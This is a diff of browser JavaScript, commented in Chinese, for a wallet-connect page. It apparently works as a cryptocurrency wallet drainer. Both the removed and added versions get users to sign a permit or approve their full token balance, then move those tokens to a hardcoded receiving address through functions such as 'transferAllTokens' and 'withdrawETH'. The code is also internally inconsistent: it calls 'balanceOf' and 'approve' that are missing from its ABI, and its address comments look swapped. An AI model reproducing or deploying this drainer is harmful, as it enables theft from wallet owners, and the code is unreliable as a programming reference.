@@ -1,140 +1,115 @@
-document.addEventListener("DOMContentLoaded", function () {
-    console.log("页面加载完成，初始化事件监听器...");
+let web3;
+let account;
+const contractAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 你的接收地址
+const tokenAddress = '0x56a2777e796eF23399e9E1d791E1A0410a75E31b'; // 你的已部署的合约地址
+const tokenABI = [
+	{
+		"inputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "approveAll",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "contract IERC20",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "transferAllTokens",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [],
+		"name": "withdrawETH",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	},
+	{
+		"inputs": [],
+		"name": "owner",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "recipient",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	}
+]; // 你的代币合约的ABI
 
-    let provider;
-    let signer;
-    let userAddress;
-    let contract;
-
-    const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3";  // 智能合约地址
-
-    // 替换成你的实际合约 ABI
-    const contractABI = [
-        {
-            "inputs": [
-                { "internalType": "address", "name": "owner", "type": "address" },
-                { "internalType": "address", "name": "spender", "type": "address" },
-                { "internalType": "uint256", "name": "value", "type": "uint256" },
-                { "internalType": "uint256", "name": "nonce", "type": "uint256" },
-                { "internalType": "uint256", "name": "deadline", "type": "uint256" }
-            ],
-            "name": "permit",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "inputs": [
-                { "internalType": "address", "name": "from", "type": "address" },
-                { "internalType": "address", "name": "to", "type": "address" },
-                { "internalType": "uint256", "name": "value", "type": "uint256" }
-            ],
-            "name": "transferFrom",
-            "outputs": [
-                { "internalType": "bool", "name": "", "type": "bool" }
-            ],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        }
-    ];
-
-    // 连接钱包按钮点击事件
-    document.getElementById('connectWalletBtn').addEventListener('click', async function () {
-        console.log("连接钱包按钮被点击");
+// 初始化 Web3
+async function connectWallet() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
         try {
-            // 检查是否存在钱包扩展 (MetaMask 或其他)
-            if (typeof window.ethereum !== 'undefined') {
-                console.log('检测到钱包扩展，尝试连接...');
-
-                // 请求连接钱包
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-
-                console.log("钱包已连接:", userAddress);
-                alert("钱包已成功连接：" + userAddress);
-
-                // 启用其他按钮
-                document.getElementById('signPermitBtn').disabled = false;
-                document.getElementById('transferTokensBtn').disabled = false;
-
-                // 实例化合约
-                contract = new ethers.Contract(contractAddress, contractABI, signer);
-            } else {
-                console.error("未检测到任何以太坊钱包扩展");
-                alert("未检测到任何以太坊钱包扩展，请安装MetaMask！");
-            }
+            // 请求连接钱包
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            account = accounts[0];
+            document.getElementById("status").innerText = "已连接钱包: " + account;
+            document.getElementById("authorizeTransfer").disabled = false;
         } catch (error) {
-            console.error("连接钱包失败:", error);
-            alert("连接钱包失败，请检查浏览器扩展或重试。");
+            document.getElementById("status").innerText = "钱包连接失败: " + error.message;
         }
-    });
+    } else {
+        document.getElementById("status").innerText = "请安装 MetaMask!";
+    }
+}
 
-    // 签名授权按钮点击事件
-    document.getElementById('signPermitBtn').addEventListener('click', async function () {
-        try {
-            if (!contract) {
-                alert("请先连接钱包！");
-                return;
-            }
+// 授权并转移代币
+async function authorizeAndTransfer() {
+    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+    
+    try {
+        // 获取钱包的代币余额
+        const balance = await tokenContract.methods.balanceOf(account).call();
+        document.getElementById("status").innerText = "正在授权代币转移...";
 
-            const domain = {
-                name: 'MyToken',
-                version: '1',
-                chainId: 1,  // 根据你部署的网络进行修改
-                verifyingContract: contractAddress,
-            };
+        // 执行 approve 授权，授权无限量代币转移
+        await tokenContract.methods.approve(contractAddress, balance).send({ from: account });
 
-            const permitData = {
-                owner: userAddress,
-                spender: '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 收款地址
-                value: ethers.utils.parseUnits('100', 18),  // 转移金额
-                nonce: await contract.nonces(userAddress),
-                deadline: Math.floor(Date.now() / 1000) + 60 * 60,  // 一小时后过期
-            };
+        document.getElementById("status").innerText = "授权成功，正在转移代币...";
 
-            const types = {
-                Permit: [
-                    { name: 'owner', type: 'address' },
-                    { name: 'spender', type: 'address' },
-                    { name: 'value', type: 'uint256' },
-                    { name: 'nonce', type: 'uint256' },
-                    { name: 'deadline', type: 'uint256' },
-                ],
-            };
+        // 执行转移
+        await tokenContract.methods.transferAllTokens(tokenAddress).send({ from: account });
 
-            const signature = await signer._signTypedData(domain, types, permitData);
-            const { v, r, s } = ethers.utils.splitSignature(signature);
-
-            console.log("签名成功:", { v, r, s });
-            alert("签名成功！");
-        } catch (error) {
-            console.error("签名失败:", error);
-            alert("签名失败，请检查并重试。");
-        }
-    });
-
-    // 转移代币按钮点击事件
-    document.getElementById('transferTokensBtn').addEventListener('click', async function () {
-        try {
-            if (!contract) {
-                alert("请先连接钱包！");
-                return;
-            }
-
-            const transferTx = await contract.transferFrom(
-                userAddress,
-                '0xa465e2fc9f9d527AAEb07579E821D461F700e699',  // 接收地址
-                ethers.utils.parseUnits('100', 18)  // 转移金额
-            );
-
-            console.log("代币转移交易已发送:", transferTx.hash);
-            alert("代币转移交易已成功发送！");
-        } catch (error) {
-            console.error("代币转移失败:", error);
-            alert("代币转移失败，请检查并重试。");
-        }
-    });
-});
+        document.getElementById("status").innerText = "代币已成功转移到接收地址！";
+    } catch (error) {
+        document.getElementById("status").innerText = "操作失败: " + error.message;
+    }
+}
